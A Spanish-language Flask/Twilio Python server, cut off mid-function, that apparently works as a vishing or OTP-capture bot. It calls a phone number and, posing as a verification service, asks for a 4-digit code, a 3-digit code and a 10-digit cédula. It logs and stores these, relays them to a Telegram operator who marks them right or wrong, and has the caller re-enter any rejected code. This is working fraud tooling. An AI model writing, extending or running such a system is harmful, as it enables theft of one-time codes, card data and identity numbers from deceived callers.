from flask import Flask, request, jsonify
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
import requests
import threading
import time
import logging
import json
import os
from datetime import datetime
import flask
from dotenv import load_dotenv

load_dotenv()

# Configurar logging
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Añadir un manejador de archivo para registro persistente
if not os.path.exists('logs'):
    os.makedirs('logs')
file_handler = logging.FileHandler(f'logs/app_{datetime.now().strftime("%Y%m%d")}.log')
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

app = Flask(__name__)


# ⚙️ Configuración desde variables de entorno
TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')
TWILIO_PHONE_NUMBER = os.getenv('TWILIO_PHONE_NUMBER')
YOUR_PHONE_NUMBER = os.getenv('YOUR_PHONE_NUMBER')

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Diccionario para almacenar sesiones de usuario - hacemos que sea global para asegurar persistencia
global_user_sessions = {}
processed_message_ids = set()

# Variable para controlar el polling de Telegram
telegram_polling_active = False
last_update_id = 0

# BASE_URL = os.getenv('BASE_URL', 'https://8f89-190-84-119-217.ngrok-free.app')
# logger.info(f"🌐 URL base configurada: {BASE_URL}")

def absolute_url(path):
    """Genera una URL absoluta sin depender del contexto de solicitud."""
    # Si estamos en un contexto de solicitud, usar la URL raíz
    if flask.has_request_context():
        base = request.url_root
    else:
        # Si no hay contexto de solicitud, usar la URL base configurada
        base = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
        if not base.endswith('/'):
            base += '/'
    
    # Asegurarnos que el path esté sin / inicial para unirlo correctamente
    path = path.lstrip('/')
    
    # Generar y loguear la URL completa para depuración
    full_url = base + path
    logger.info(f"🔗 URL generada: {full_url}")
    
    return full_url

# Funciones de persistencia de sesiones
def save_session_to_file(sessions_dict):
    """Guarda las sesiones en un archivo JSON para persistencia."""
    try:
        with open('sessions.json', 'w') as f:
            json.dump(sessions_dict, f)
            logger.info("📝 Sesiones guardadas en archivo")
    except Exception as e:
        logger.error(f"❌ Error al guardar sesiones: {e}")

def load_sessions_from_file():
    """Carga las sesiones desde un archivo JSON."""
    try:
        if os.path.exists('sessions.json'):
            with open('sessions.json', 'r') as f:
                sessions = json.load(f)
                logger.info(f"📂 Sesiones cargadas desde archivo: {len(sessions)} sesiones")
                return sessions
        else:
            logger.info("📂 No hay archivo de sesiones previo")
    except Exception as e:
        logger.error(f"❌ Error al cargar sesiones: {e}")
    return {}

# Cargar sesiones al inicio
global_user_sessions = load_sessions_from_file()

@app.route('/')
def index():
    return "Servidor de llamadas y verificación activo."



@app.route('/make-call')
def make_call():
    # Iniciar polling de Telegram si no está activo
    start_telegram_polling()
    
    # Construir la URL correctamente
    base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
    url = f"{base_url}/step1"
    status_callback_url = f"{base_url}/call-status-callback"
    
    logger.info(f"📞 URL para la llamada: {url}")
    logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
    
    try:
        call = client.calls.create(
            to=YOUR_PHONE_NUMBER,
            from_=TWILIO_PHONE_NUMBER,
            url=url,
            status_callback=status_callback_url,
            status_callback_method='POST',
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
        )
        
        # Inicializar la sesión para el nuevo SID
        global_user_sessions[call.sid] = {
            'call_status': 'initiated',
            'to_number': YOUR_PHONE_NUMBER,
            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_session_to_file(global_user_sessions)
        
        # Notificar a Telegram
        send_to_telegram(f"🚀 <b>Llamada iniciada</b>\nSID: {call.sid}\nNúmero: {YOUR_PHONE_NUMBER}\nEstado: Iniciando...")
        
        logger.info(f"📞 Nueva llamada iniciada: SID={call.sid}")
        return jsonify({"status": "Llamada iniciada", "sid": call.sid})
    except Exception as e:
        logger.error(f"❌ ERROR AL INICIAR LLAMADA: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Función auxiliar para identificar llamadas desde Telegram

@app.route('/call-status-callback', methods=['POST'])
def call_status_callback():
    """Endpoint para recibir actualizaciones de estado de llamada desde Twilio."""
    call_sid = request.values.get('CallSid')
    call_status = request.values.get('CallStatus')
    call_duration = request.values.get('CallDuration', '0')
    
    logger.info(f"📞 ACTUALIZACIÓN DE ESTADO DE LLAMADA: SID={call_sid}, Estado={call_status}, Duración={call_duration}s")
    
    # Verificar si existe la sesión para este SID
    if call_sid not in global_user_sessions:
        logger.warning(f"⚠️ Recibida actualización para SID desconocido: {call_sid}")
        global_user_sessions[call_sid] = {}
    
    # Guardar el estado y la hora de la actualización
    last_status = global_user_sessions[call_sid].get('call_status')
    global_user_sessions[call_sid]['call_status'] = call_status
    global_user_sessions[call_sid]['last_update'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    global_user_sessions[call_sid]['call_duration'] = call_duration
    
    # Obtener el número de teléfono si existe
    to_number = global_user_sessions[call_sid].get('to_number', 'desconocido')
    
    # Guardar los cambios
    save_session_to_file(global_user_sessions)
    
    # Verificar si la llamada fue iniciada desde Telegram
    telegram_chat_id = global_user_sessions[call_sid].get('telegram_chat_id')
    
    # Evitar duplicar notificación inicial para llamadas desde Telegram
    skip_initial_notification = (call_status == "initiated" and telegram_chat_id and last_status is None)
    
    # Solo enviar notificación si el estado ha cambiado Y no es una duplicación
    if call_status != last_status and not skip_initial_notification:
        # Definir un icono según el estado
        status_icon = "📞"
        status_desc = "Estado actualizado"
        
        if call_status == "initiated":
            status_icon = "🔄"
            status_desc = "Llamada iniciada"
        elif call_status == "ringing":
            status_icon = "📳"
            status_desc = "Teléfono sonando"
        elif call_status == "in-progress":
            status_icon = "✅"
            status_desc = "Llamada contestada"
        elif call_status == "completed":
            status_icon = "🏁"
            status_desc = "Llamada finalizada"
        elif call_status == "busy":
            status_icon = "🔴"
            status_desc = "Número ocupado"
        elif call_status == "no-answer":
            status_icon = "❌"
            status_desc = "Sin respuesta"
        elif call_status == "failed":
            status_icon = "⚠️"
            status_desc = "Llamada fallida"
        elif call_status == "canceled":
            status_icon = "🚫"
            status_desc = "Llamada cancelada"
        
        # Crear mensaje de notificación
        message = f"{status_icon} <b>{status_desc}</b>\nSID: {call_sid}\nNúmero: {to_number}\nEstado: {call_status}"
        
        # Añadir duración si está disponible y no es cero
        if call_status in ["completed", "in-progress"] and call_duration != '0':
            message += f"\nDuración: {call_duration}s"
        
        # Enviar notificación a Telegram
        send_to_telegram(message)
        
        # Si hay un chat_id específico guardado, enviar también la notificación allí
        if telegram_chat_id:
            send_telegram_response(telegram_chat_id, message)
    
    return jsonify({"status": "ok"})

@app.route('/step1', methods=['POST', 'GET'])
def step1():
    response = VoiceResponse()
    gather = Gather(num_digits=4, action='/save-step1', method='POST', timeout=20, finish_on_key='')
    gather.say("Por favor ingrese el código de verificación de 4 dígitos.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese los 4 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step1')
    return str(response)

@app.route('/save-step1', methods=['POST'])
def save_step1():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 1: CallSid={call_sid}, Digits={digits}")
    
    if not digits:
        return redirect_twiml('/step1')
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación
    is_revalidation = 'validacion' in global_user_sessions[call_sid]
    
    # Guardar el nuevo código
    global_user_sessions[call_sid]['code4'] = digits
    
    # Si había una validación previa, la eliminamos para forzar una nueva validación
    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
        global_user_sessions[call_sid].pop('validacion', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado código 4 dígitos: {digits} para SID={call_sid}")
    
    response = VoiceResponse()
    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
    
    # Si estamos en revalidación, notificar a Telegram y esperar validación
    if is_revalidation:
        data = global_user_sessions[call_sid]
        msg = f"🔄 Código de 4 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
    else:
        # Flujo normal: continuar al siguiente paso
        response.say("Continuando.", language='es-ES')
        response.redirect('/step2')
    
    return str(response)

@app.route('/step2', methods=['POST', 'GET'])
def step2():
    response = VoiceResponse()
    gather = Gather(num_digits=3, action='/save-step2', method='POST', timeout=20, finish_on_key='')
    gather.say("Ahora ingrese el segundo código de 3 dígitos.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese los 3 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step2')
    return str(response)

@app.route('/save-step2', methods=['POST'])
def save_step2():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 2: CallSid={call_sid}, Digits={digits}")
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación
    is_revalidation = 'validacion' in global_user_sessions[call_sid]
    
    # Guardar el nuevo código
    global_user_sessions[call_sid]['code3'] = digits
    
    # Si había una validación previa, la eliminamos para forzar una nueva validación
    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
        global_user_sessions[call_sid].pop('validacion', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado código 3 dígitos: {digits} para SID={call_sid}")
    
    response = VoiceResponse()
    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
    
    # Si estamos en revalidación, notificar a Telegram y esperar validación
    if is_revalidation:
        data = global_user_sessions[call_sid]
        msg = f"🔄 Código de 3 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
    else:
        # Flujo normal: continuar al siguiente paso
        response.say("Continuando.", language='es-ES')
        response.redirect('/step3')
    
    return str(response)

@app.route('/step3', methods=['POST', 'GET'])
def step3():
    response = VoiceResponse()
    gather = Gather(num_digits=10, action='/save-step3', method='POST', timeout=30, finish_on_key='')
    gather.say("Por favor ingrese su número de cédula.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese su número de cédula de 10 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step3')
    return str(response)

# save-step3 para usar la ruta de espera

@app.route('/save-step3', methods=['POST'])
def save_step3():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 3: CallSid={call_sid}, Digits={digits}")
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación
    is_revalidation = 'validacion' in global_user_sessions[call_sid]
    
    # Guardar el código (cédula)
    global_user_sessions[call_sid]['cedula'] = digits
    
    # Si había una validación previa, la eliminamos para forzar una nueva validación
    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
        global_user_sessions[call_sid].pop('validacion', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado cédula: {digits} para SID={call_sid}")

    data = global_user_sessions[call_sid]
    logger.info(f"⚠️ DATOS COMPLETOS PARA SID={call_sid}: {data}")
    
    # Iniciar polling de Telegram si no está activo
    start_telegram_polling()
    
    response = VoiceResponse()
    response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
    
    # Verificar la longitud de los dígitos ingresados
    digit_length = len(digits)
    logger.info(f"📏 Longitud de cédula ingresada: {digit_length} dígitos")
    
    # Agregar pausa de 3 segundos si son 7 dígitos
    if digit_length == 7:
        logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
        response.pause(length=3)
    
    # Mensaje diferente dependiendo si es validación inicial o revalidación
    if is_revalidation:
        msg = f"🔄 Cédula actualizada:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
    else:
        msg = f"📞 Nueva verificación:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos validando su información. Por favor, espere unos momentos.", language='es-ES')
    
    # Redirigir a la ruta de espera con el parámetro de revalidación apropiado
    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation={str(is_revalidation).lower()}")
    return str(response)


# ruta para re-verificación específica
@app.route('/reverify', methods=['POST', 'GET'])
def reverify():
    """
    Ruta para cuando se necesita volver a verificar todos los datos.
    """
    call_sid = request.values.get('CallSid')
    logger.info(f"🔄 SOLICITANDO RE-VERIFICACIÓN PARA SID={call_sid}")
    
    response = VoiceResponse()
    response.say("Sus datos requieren una nueva verificación. Esto puede tomar un momento.", language='es-ES')
    response.say("Estamos procesando sus códigos y documento de identidad. Por favor espere.", language='es-ES')
    
    # Enviar una notificación al operador de Telegram
    if call_sid and call_sid in global_user_sessions:
        data = global_user_sessions[call_sid]
        msg = f"🔄 Solicitando RE-VERIFICACIÓN:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
        send_to_telegram(msg)
    
    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=10")
    return str(response)

@app.route('/validate-result', methods=['GET', 'POST'])
def validate_result():
    call_sid = request.values.get('sid')
    logger.info(f"⚠️ VERIFICANDO VALIDACIÓN PARA SID: {call_sid}")
    
    # Usar otra estrategia para conseguir el SID si no se pasó como parámetro
    if not call_sid and request.values.get('CallSid'):
        call_sid = request.values.get('CallSid')
        logger.info(f"📞 Usando CallSid del request: {call_sid}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el SID para validación")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Imprime todas las sesiones para depuración
    logger.info(f"⚠️ SESIONES ACTUALES: {list(global_user_sessions.keys())}")
    logger.info(f"⚠️ BUSCANDO SID: {call_sid}")
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar si existe la clave 'validacion'
    validation = global_user_sessions.get(call_sid, {}).get('validacion')
    logger.info(f"⚠️ ESTADO DE VALIDACIÓN PARA SID={call_sid}: {validation}")

    response = VoiceResponse()

    # Si tenemos una validación
    if validation:
        logger.info(f"⚠️ VALIDACIÓN ENCONTRADA PARA SID={call_sid}: {validation}")
        
        # Resetear el contador de intentos ya que tenemos una validación
        count_key = f"{call_sid}_retry_count"
        if count_key in global_user_sessions.get(call_sid, {}):
            global_user_sessions[call_sid][count_key] = 0
            save_session_to_file(global_user_sessions)
        
        if validation == [1, 1, 1]:
            response.say("Verificación completada con éxito. Todos los datos son correctos. Gracias por su paciencia.", language='es-ES')
            return str(response)
        else:
            # Mensaje general cuando hay errores
            response.say("Hemos detectado algunos problemas con la información proporcionada.", language='es-ES')
            
            # Verificar qué código es incorrecto y redirigir
            if validation[0] == 0:
                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÓDIGO INCORRECTO PARA SID={call_sid}")
                response.say("El primer código de verificación parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                response.redirect('/step1')
            elif validation[1] == 0:
                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO INCORRECTO PARA SID={call_sid}")
                response.say("El segundo código de verificación parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                response.redirect('/step2')
            elif validation[2] == 0:
                logger.info(f"⚠️ REDIRIGIENDO A PASO 3 - CÉDULA INCORRECTA PARA SID={call_sid}")
                response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
                response.redirect('/step3')
            return str(response)
    else:
        # Añadimos un contador para evitar bucles infinitos
        count_key = f"{call_sid}_retry_count"
        retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
        
        # Si llevamos más de 8 intentos, finalizamos la llamada
        if retry_count > 8:
            logger.warning(f"⚠️ DEMASIADOS INTENTOS ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
            response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
            return str(response)
        
        # Incrementar contador
        if call_sid in global_user_sessions:
            global_user_sessions[call_sid][count_key] = retry_count + 1
            save_session_to_file(global_user_sessions)
            logger.info(f"⚠️ ESPERANDO VALIDACIÓN PARA SID={call_sid}. INTENTO {retry_count + 1}")
        
        # Mensajes variados para que no suene repetitivo
        if retry_count % 3 == 0:
            response.say("Seguimos validando sus datos. Gracias por su paciencia.", language='es-ES')
        elif retry_count % 3 == 1:
            response.say("Continuamos con el proceso de verificación. Por favor espere un momento más.", language='es-ES')
        else:
            response.say("Sus datos están siendo procesados. La validación está en curso.", language='es-ES')
            
        # Añadir una pausa de 10 segundos entre mensajes de voz
        response.pause(length=10)
        
        # Verificar explícitamente si hay validación antes de continuar
        if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
            logger.info(f"✅ VALIDACIÓN DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
            response.redirect(f"/validate-result?sid={call_sid}")
        else:
            response.redirect(f"/validate-result?sid={call_sid}")
    
    return str(response)

@app.route('/waiting-validation', methods=['POST', 'GET'])
def waiting_validation():
    """
    Ruta específica para mostrar un mensaje de espera mientras se validan los datos.
    Permite especificar un tiempo de espera y redirecciona al resultado de validación.
    """
    call_sid = request.values.get('CallSid')
    wait_time = int(request.values.get('wait', 10))  # Tiempo de espera reducido a 10 segundos por defecto
    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
    
    logger.info(f"⏳ ESPERANDO VALIDACIÓN PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el CallSid para la espera de validación")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar inmediatamente si ya hay una validación (para evitar esperas innecesarias)
    if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"⚠️ VALIDACIÓN YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion']}")
        response = VoiceResponse()
        response.redirect(f"/validate-result?sid={call_sid}")
        return str(response)
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    response = VoiceResponse()
    
    # Añadir un mensaje personalizado de espera
    if is_revalidation:
        response.say("Estamos validando sus datos actualizados. Por favor espere unos momentos.", language='es-ES')
    else:
        response.say("Estamos validando sus datos. Por favor espere unos momentos.", language='es-ES')
    
    # tiempo de pausa en segundos
    response.pause(length=10)
    
    # Redirigir a la verificación de resultados después de la espera
    if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
        logger.info(f"✅ VALIDACIÓN DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
        response.redirect(f"/validate-result?sid={call_sid}")
    else:
        # Redirigir a la verificación de resultados después de la espera
        response.redirect(f"/validate-result?sid={call_sid}")
    
    return str(response)

# Función para revalidar datos específicos
@app.route('/revalidate/<data_type>', methods=['POST', 'GET'])
def revalidate_data(data_type):
    """
    Permite revalidar un tipo específico de dato (code4, code3 o cedula).
    """
    call_sid = request.values.get('CallSid')
    
    if not call_sid:
        logger.error("❌ No se pudo obtener el CallSid para revalidación")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
        return str(response)
        
    logger.info(f"🔄 REVALIDANDO {data_type} PARA SID={call_sid}")
    
    response = VoiceResponse()
    
    # Mensaje personalizado según el tipo de dato a revalidar
    if data_type == 'code4':
        response.say("Necesitamos verificar nuevamente el primer código de cuatro dígitos.", language='es-ES')
        response.redirect('/step1')
    elif data_type == 'code3':
        response.say("Necesitamos verificar nuevamente el segundo código de tres dígitos.", language='es-ES')
        response.redirect('/step2')
    elif data_type == 'cedula':
        response.say("Necesitamos verificar nuevamente su número de cédula de identidad.", language='es-ES')
        response.redirect('/step3')
    elif data_type == 'all':
        # Si se solicita revalidar todo, reiniciamos el contador de intentos
        if call_sid in global_user_sessions:
            count_key = f"{call_sid}_retry_count"
            if count_key in global_user_sessions[call_sid]:
                global_user_sessions[call_sid][count_key] = 0
                save_session_to_file(global_user_sessions)
                logger.info(f"🔄 REINICIADO CONTADOR DE INTENTOS PARA SID={call_sid}")
        
        response.say("Necesitamos reiniciar el proceso de verificación.", language='es-ES')
        response.say("Por favor, proporcione nuevamente toda su información.", language='es-ES')
        response.redirect('/step1')
    else:
        response.say("Lo sentimos, no se reconoce qué dato necesita verificación.", language='es-ES')
        response.redirect(f"/validate-result?sid={call_sid}")
    
    return str(response)

# Endpoint adicional para verificación con tiempo personalizado
@app.route('/verify-with-timeout', methods=['POST', 'GET'])
def verify_with_timeout():
    """
    Permite especificar un tiempo personalizado para la espera de validación.
    Útil cuando el operador necesita más tiempo.
    """
    call_sid = request.values.get('CallSid')
    wait_time = request.values.get('wait', '20')  # Tiempo en segundos, por defecto 20
    
    try:
        wait_time = int(wait_time)
    except ValueError:
        wait_time = 20  # Valor predeterminado si hay error
    
    response = VoiceResponse()
    
    # Mensaje personalizado para esperas largas
    if wait_time > 30:
        response.say("La verificación requiere un tiempo adicional. Le agradecemos su paciencia.", language='es-ES')
        response.say("Estamos trabajando para procesar sus datos correctamente.", language='es-ES')
    else:
        response.say("Estamos procesando su información. Por favor, espere un momento.", language='es-ES')
    
    # Añadir una música o sonido para esperas largas podría ser apropiado
    response.pause(length=wait_time)
    response.redirect(f"/validate-result?sid={call_sid}")
    
    # Notificar al operador sobre esta espera prolongada
    if call_sid in global_user_sessions:
        send_to_telegram(f"⏱️ Espera prolongada establecida para SID={call_sid}: {wait_time} segundos")
    
    return str(response)

@app.route('/manual-validar', methods=['GET'])
def manual_validar():
    """
    Permite validar directamente desde la web:
    /manual-validar?sid=XXX&code4=1&code3=1&cedula=1
    """
    sid = request.args.get('sid')
    code4 = int(request.args.get('code4', 1))
    code3 = int(request.args.get('code3', 1))
    cedula = int(request.args.get('cedula', 1))
    
    if not sid:
        return jsonify({"error": "Se requiere el parámetro 'sid'"})
    
    # Asegurar que la sesión existe para este SID
    if sid not in global_user_sessions:
        global_user_sessions[sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={sid} en manual-validar")
    
    global_user_sessions[sid]['validacion'] = [code4, code3, cedula]
    save_session_to_file(global_user_sessions)
    
    logger.info(f"⚠️ VALIDACIÓN MANUAL GUARDADA PARA SID {sid}: [{code4}, {code3}, {cedula}]")
    return jsonify({"status": "ok", "message": f"Validación guardada para {sid}"})

@app.route('/validar', methods=['POST', 'GET'])
def validar():
    """
    Se espera que el operador escriba en Telegram:
    /validar <call_sid> 1 1 0
    """
    # Obtiene el texto del comando de manera más robusta
    text = ''
    if request.method == 'GET':
        text = request.args.get('text', '')
    else:  # POST
        if request.is_json:
            text = request.json.get('text', '')
        else:
            text = request.values.get('text', '')
    
    logger.info(f"⚠️ VALIDAR RECIBIDO: {text}")
    
    return process_validation_command(text)

def process_validation_command(text):
    """Procesa un comando de validación y devuelve el resultado."""
    # Soportar tanto "/validar" como "validar" (sin slash)
    if text.startswith('/validar') or text.startswith('validar'):
        parts = text.split()
        logger.info(f"⚠️ PARTES DEL COMANDO: {parts}")
        
        if len(parts) >= 5:
            # El formato esperado es: ['/validar', 'CALL_SID', '1', '1', '1']
            cmd = parts[0]
            sid = parts[1]
            
            try:
                vals = list(map(int, parts[2:5]))
                logger.info(f"⚠️ VALIDACIÓN PARA SID {sid}: {vals}")
                
                # Asegurar que la sesión existe para este SID
                if sid not in global_user_sessions:
                    global_user_sessions[sid] = {}
                    logger.info(f"🆕 Creada nueva sesión para SID={sid} en process_validation_command")
                
                # Guardar la validación
                global_user_sessions[sid]['validacion'] = vals
                save_session_to_file(global_user_sessions)
                
                logger.info(f"⚠️ VALIDACIÓN GUARDADA PARA SID {sid} EN WEBAPI")
                return jsonify({"status": "ok", "message": "Validación guardada"})
                
            except Exception as e:
                logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN: {e}")
                return jsonify({"error": f"Error al procesar: {e}"})
    
    logger.warning("⚠️ FORMATO INCORRECTO EN VALIDAR")
    return jsonify({"error": "Formato incorrecto"})

def redirect_twiml(url_path):
    """Atajo para redirección de Twilio."""
    response = VoiceResponse()
    response.redirect(url_path)
    return str(response)

def send_to_telegram(message):
    """Envía mensaje a Telegram y espera la validación."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    try:
        logger.info(f"⚠️ ENVIANDO MENSAJE A TELEGRAM: {message[:50]}...")
        response = requests.post(url, data=data)
        logger.info(f"⚠️ RESPUESTA DE TELEGRAM: {response.status_code} - {response.text[:50]}")
        return response.json()
    except Exception as e:
        logger.error(f"❌ ERROR AL ENVIAR A TELEGRAM: {e}")
        return None

def is_call_from_telegram(call_sid):
    """Verifica si una llamada fue iniciada desde Telegram."""
    return (call_sid in global_user_sessions and 
            'telegram_chat_id' in global_user_sessions[call_sid])


def send_telegram_response(chat_id, text):
    """Envía una respuesta directa a un chat de Telegram."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    try:
        response = requests.post(url, data=data)
        logger.info(f"⚠️ RESPUESTA ENVIADA A TELEGRAM: {text[:50]}... - Status: {response.status_code}")
        return response.json()
    except Exception as e:
        logger.error(f"❌ ERROR AL ENVIAR RESPUESTA A TELEGRAM: {e}")
        return None

# ----- FUNCIONALIDAD: POLLING DE TELEGRAM -----

def fetch_telegram_updates():
    """Obtiene actualizaciones de Telegram mediante el método getUpdates."""
    global last_update_id
    
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates'
    params = {'timeout': 30}
    
    if last_update_id > 0:
        params['offset'] = last_update_id + 1
    
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            updates = response.json()
            if updates.get('ok') and updates.get('result'):
                logger.info(f"📥 Recibidas {len(updates['result'])} actualizaciones de Telegram")
                return updates['result']
    except Exception as e:
        logger.error(f"❌ ERROR AL OBTENER ACTUALIZACIONES DE TELEGRAM: {e}")
    
    return []

def process_telegram_update(update):
    """Procesa una actualización de Telegram."""
    global last_update_id, processed_message_ids
    
    # Actualizar el último ID de actualización
    update_id = update.get('update_id', 0)
    if update_id > last_update_id:
        last_update_id = update_id
    
    # Procesar mensajes de texto
    if 'message' in update and 'text' in update['message']:
        chat_id = update['message']['chat']['id']
        message_text = update['message']['text']
        message_id = update['message']['message_id']
        
        # Control para evitar procesar mensajes duplicados
        if message_id in processed_message_ids:
            logger.info(f"🔄 Mensaje ya procesado, ID: {message_id}. Ignorando.")
            return
            
